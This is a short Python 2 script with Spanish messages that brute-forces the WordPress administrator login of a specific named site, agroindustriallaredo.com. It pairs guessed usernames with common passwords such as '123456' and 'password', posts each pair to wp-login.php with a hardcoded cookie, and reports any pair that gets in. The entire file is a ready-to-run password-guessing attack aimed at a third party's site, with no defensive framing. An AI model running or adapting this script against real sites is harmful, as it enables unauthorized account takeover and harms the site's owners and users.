import requests, time
usuarios = {"cmedina", "carlos"} 
claves = {"123456", "password"}
headers = {"User-Agent": "Mozilla", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://www.agroindustriallaredo.com/wp-login.php", "Cookie": "X-Mapping-ndkaleoo=EC0577D98CACFFA2F9E1586D6CBEE47B; wordpress_test_cookie=WP+Cookie+check", "Connection": "close", "Content-Type": "application/x-www-form-urlencoded"}
vulnerable = False
contador = 0
print "[+] Adivinando claves..."
print ""
for clave in claves:
    for usuario in usuarios:
        contador = contador + 1
        print "  probando %s:%s " % (usuario, clave)
        data = "log=%s&pwd=%s&wp-submit=Iniciar+sesion&redirect_to=http://www.agroindustriallaredo.com/wp-admin/&testcookie=1" % (usuario, clave)
        res = requests.post("http://www.agroindustriallaredo.com/wp-login.php", headers=headers, data=data)
        if res.status_code == 503:
            print "[!] ERROR: Incremente el valor de la variable sleep"
            print exit(0)
        if res.text.find("es incorrecta") == -1:
            print "  [!] Clave encontrada %s: (%s)" % (usuario, clave)
            vulnerable = True
        time.sleep(3)

        if contador >= 3:
            vulnerable = True

print ""
if vulnerable == True:
    print "[!] VULNERABLE"
else:
    print "[!] NO VULNERABLE"
